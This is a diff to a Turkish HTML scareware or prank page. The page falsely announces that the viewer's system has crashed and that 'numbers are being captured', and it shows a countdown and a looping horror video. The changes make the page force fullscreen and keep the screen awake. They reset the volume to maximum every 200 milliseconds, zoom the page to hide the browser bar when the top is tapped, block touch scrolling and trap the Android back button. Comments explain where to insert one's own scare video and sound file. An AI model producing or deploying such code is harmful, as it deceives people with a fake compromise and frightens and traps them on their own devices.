@@ -2,8 +2,8 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SİSTEM ELE GEÇİRİLDİ</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Zahir VİRÜS - SİSTEM ÇÖKTÜ</title>
     <style>
         body {
             background-color: black;
@@ -13,19 +13,22 @@
             padding: 0;
             overflow: hidden;
             height: 100vh;
+            width: 100vw;
             display: flex;
             justify-content: center;
             align-items: center;
             text-align: center;
             cursor: none;
-            user-select: none; /* Metin seçimini engelle */
+            user-select: none;
             -webkit-user-select: none;
+            touch-action: none; /* Mobilde sayfayı kaydırmayı engelle */
         }
 
         #main-content {
             width: 100%;
             height: 100%;
             position: relative;
+            transition: transform 0.1s; /* Zoom geçişi */
         }
 
         .warning-text {
@@ -64,20 +67,19 @@
             z-index: 10;
         }
 
-        #granny {
+        /* Korkunç Video Katmanı */
+        #scary-video {
             position: absolute;
-            bottom: -100px;
+            top: 50%;
             left: 50%;
-            transform: translateX(-50%);
-            width: 100vw;
-            height: 100vh;
-            background-image: url('https://i.pinimg.com/736x/8a/e4/22/8ae422f2bc08ed6a8617eb6d9a144d4e.jpg'); 
-            background-size: cover;
-            background-position: center;
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            transform: translate(-50%, -50%) scale(1.5);
             z-index: 5;
-            animation: approach 2s infinite; 
-            mix-blend-mode: screen; 
             opacity: 0.8;
+            animation: video-zoom 2s infinite alternate;
         }
 
         @keyframes flash {
@@ -105,10 +107,9 @@
             100% { transform: scale(1.2); }
         }
 
-        @keyframes approach {
-            0% { transform: translateX(-50%) scale(0.5); filter: blur(5px); }
-            50% { transform: translateX(-50%) scale(1.2); filter: blur(0px); }
-            100% { transform: translateX(-50%) scale(2); filter: blur(10px); opacity: 0; }
+        @keyframes video-zoom {
+            0% { transform: translate(-50%, -50%) scale(1.2); filter: contrast(150%) hue-rotate(0deg); }
+            100% { transform: translate(-50%, -50%) scale(2.0); filter: contrast(200%) hue-rotate(30deg); }
         }
         
         body.glitch {
@@ -124,7 +125,7 @@
             100% { filter: invert(0); transform: translate(0,0); }
         }
 
-        /* Ses açma zorunluluğu için görünmez katman */
+        /* Tıklama Katmanı */
         #unmute-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -143,53 +144,77 @@
         <div id="status2" class="warning-text">NUMARALAR ELE GEÇİRİLİYOR 1-100</div>
         <div id="timer" class="warning-text">100</div>
         
-        <div id="granny"></div>
-        
-        <!-- Ses Kaynağı -->
+        <!-- KORKUNÇ VİDEO (BURAYA KENDİ VİDEO LİNKİNİ VEYA DOSYANI KOY) -->
+        <!-- Örnek olarak internetteki bir korku videosunu kullandım, kendi videonu koymak için src="video.mp4" yapabilirsin -->
+        <video id="scary-video" autoplay loop muted playsinline>
+            <source src="https://cdn.pixabay.com/video/2022/04/12/112647-698472061_large.mp4" type="video/mp4">
+        </video>
+
+        <!-- SES KAYNAĞI (Zahir.mp3 dosyasını index.html ile aynı klasöre at) -->
         <audio id="horror-sound" loop preload="auto">
-            <source src="https://www.myinstants.com/media/sounds/granny-scream.mp3" type="audio/mpeg">
+            <source src="Zahir.mp3" type="audio/mpeg">
         </audio>
     </div>
 
     <script>
         const timerElement = document.getElementById('timer');
         const audio = document.getElementById('horror-sound');
+        const video = document.getElementById('scary-video');
         const body = document.body;
         const overlay = document.getElementById('unmute-overlay');
+        const mainContent = document.getElementById('main-content');
         let timeLeft = 100;
 
-        // 1. TAM EKRAN VE SESİ FULLEME MANTIĞI
-        // Kullanıcı ekrana ilk dokunduğunda çalışır
+        // Tıklanınca çalışacak korku başlatıcı
         function startHorror() {
-            // Tam ekran yap (Tarayıcı çubuklarını gizler)
+            // 1. TAM EKRAN YAP (Üstteki başlık çubuğunu gizler)
             if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(err => console.log("Tam ekran hatası:", err));
+                document.documentElement.requestFullscreen().catch(err => console.log(err));
             } else if (document.documentElement.webkitRequestFullscreen) {
                 document.documentElement.webkitRequestFullscreen();
             }
 
-            // Sesi %100 yap ve oynat
+            // 2. SESİ FULLE VE OYNAT
             audio.volume = 1.0; 
             audio.play().catch(e => console.log("Ses engellendi:", e));
+            
+            // Videoyu da sesli oynat (Tarayıcı kuralı gereği tıklama sonrası izin verir)
+            video.muted = false;
+            video.volume = 0; // Videonun kendi sesini kapat ki Zahir.mp3 duyulsun
+            video.play().catch(e => console.log("Video hatası:", e));
 
-            // Ekranın kararmasını engelle (Ekran açık kalsın)
+            // Ekran kararmasını engelle
             if ('wakeLock' in navigator) {
                 navigator.wakeLock.request('screen').catch(err => console.log(err));
             }
 
-            // Overlay'i kaldır ki bir daha tıklamaya gerek kalmasın
             overlay.style.display = 'none';
             
-            // Dinleyicileri temizle
             document.removeEventListener('click', startHorror);
             document.removeEventListener('touchstart', startHorror);
         }
 
-        // Tıklama veya dokunma algıla
         document.addEventListener('click', startHorror);
         document.addEventListener('touchstart', startHorror);
 
-        // 2. GERİ SAYIM
+        // 3. SESİ SÜREKLİ FULDE TUTMA MANTIĞI
+        // Her 200 milisaniyede bir ses seviyesini kontrol et, eğer düşürülürse tekrar 1.0 yap!
+        setInterval(() => {
+            if (!audio.paused && audio.volume < 1.0) {
+                audio.volume = 1.0;
+            }
+        }, 200);
+
+        // 4. BAŞLIĞA TIKLANINCA EKRANI ZOOM YAPIP GİZLEME
+        document.addEventListener('click', function(e) {
+            // Eğer üst tarafa (başlığa) tıklanırsa, ekranı devasa boyuta yakınlaştır
+            if (e.clientY < 100) { 
+                mainContent.style.transform = "scale(5) translateY(50px)";
+                body.style.overflow = "hidden"; // Kaydırmayı tamamen kapat
+            }
+        });
+
+        // 5. GERİ SAYIM
         const countdown = setInterval(() => {
             timeLeft--;
             timerElement.innerText = timeLeft;
@@ -202,27 +227,10 @@
             }
         }, 1000);
 
-        // 3. SÜREKLİ YAKLAŞAN YARATIK EFEKTİ
-        setInterval(() => {
-            const granny = document.getElementById('granny');
-            const randomScale = 1 + Math.random() * 3;
-            const randomX = (Math.random() - 0.5) * 40;
-            const randomY = (Math.random() - 0.5) * 40;
-            
-            granny.style.transform = `translateX(calc(-50% + ${randomX}px)) scale(${randomScale})`;
-            granny.style.filter = `blur(${Math.random() * 5}px)`;
-            granny.style.opacity = 0.5 + Math.random() * 0.5;
-            
-            if(Math.random() > 0.6) {
-                body.style.backgroundColor = "darkred";
-                setTimeout(() => { body.style.backgroundColor = "black"; }, 100);
-            }
-        }, 150);
-
-        // 4. GERİ TUŞUNU ENGELLEME (Android)
+        // 6. GERİ TUŞUNU ENGELLEME (Android)
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
-            history.go(1); // Geri gitmesini engelle
+            history.go(1); 
         };
     </script>
 </body>
